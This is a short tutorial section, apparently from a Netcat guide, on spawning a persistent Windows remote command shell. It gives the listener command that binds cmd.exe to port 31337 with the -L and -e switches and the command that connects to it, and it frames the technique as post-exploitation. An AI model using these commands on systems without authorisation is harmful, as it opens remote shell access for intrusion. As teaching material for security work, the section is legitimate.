## WINDOWS REMOTE SHELL (AND SIMPLE POST-EXPLOITATION HI-JINKS)
To begin with, we will spawn a remote shell on a Windows platform in the following steps:

## Preparing the listener
To prepare the listener, we will type the following command into the command line:
```
nc –Lp 31337 –vv –e cmd.exe
```
![image](https://user-images.githubusercontent.com/47218880/68691944-38f45480-053a-11ea-9266-2854afd17158.png)

In the preceding example, we are using the capital L switch (-L) to maintain a persistent connection with the listener. This is only a Windows feature, and while it is possible to craft a script to do something similar on the Linux side, we will not be covering that in now. Keep in mind that under typical use, when we disconnect from our client machine, the Netcat executable terminates. With the –L switch, the executable continues to listen for new connection attempts.

The –vv switch tells Netcat to be extra verbose with its output. For this particular feature, the –vv switch will not do much; however, in file transfers and other use cases it will, as we will see later.

The –e switch is where the magic happens. As noted in the Installation section, the –e switch indicates the DGAPING_SECURITY_HOLE feature, and allows us to do the devious things we are about to do. cmd.exe is the name of the executable for a command shell in Windows. Now, given the context and the steps explained previously, perhaps it is more understandable as to why Antivirus packages and firewalls flag Netcat as potentially malicious.

## Connecting to the target
Connecting to the target is as simple as our first exercises, and simply consists of the following string:
```
nc 192.168.0.10 31337
```

![image](https://user-images.githubusercontent.com/47218880/68692055-6ccf7a00-053a-11ea-922f-7244c47da0e9.png)


## Running a directory listing on the target
Once we have our Windows command shell launched, we can interact with it as if we were using Telnet or working on the console directly.

![image](https://user-images.githubusercontent.com/47218880/68692091-7f49b380-053a-11ea-9725-e5e6ac191784.png)

![image](https://user-images.githubusercontent.com/47218880/68692114-896bb200-053a-11ea-831b-4365aa1180fa.png)




























